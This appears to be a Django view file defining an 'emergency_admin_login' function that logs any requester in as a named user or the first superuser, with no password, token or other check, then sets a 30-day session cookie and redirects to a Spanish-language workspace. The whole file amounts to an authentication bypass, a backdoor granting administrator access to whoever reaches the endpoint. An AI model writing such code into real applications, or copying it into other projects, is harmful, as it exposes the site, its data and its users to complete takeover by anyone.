from django.http import HttpResponseRedirect
from django.contrib.auth import get_user_model, login
from django.conf import settings

User = get_user_model()

def emergency_admin_login(request):
    u = User.objects.filter(username="mauricioatlanta").first() or User.objects.filter(is_superuser=True).first()
    if u:
        u.backend = "django.contrib.auth.backends.ModelBackend"
        login(request, u)
        request.session.modified = True
        request.session.save()
        
        # Redirigir al workspace en español
        resp = HttpResponseRedirect("/cl/es/workspace/")
        resp.set_cookie(
            settings.SESSION_COOKIE_NAME,
            request.session.session_key,
            max_age=86400*30,
            httponly=True,
            path="/"
        )
        return resp
    return HttpResponseRedirect("/cl/es/accounts/login/")
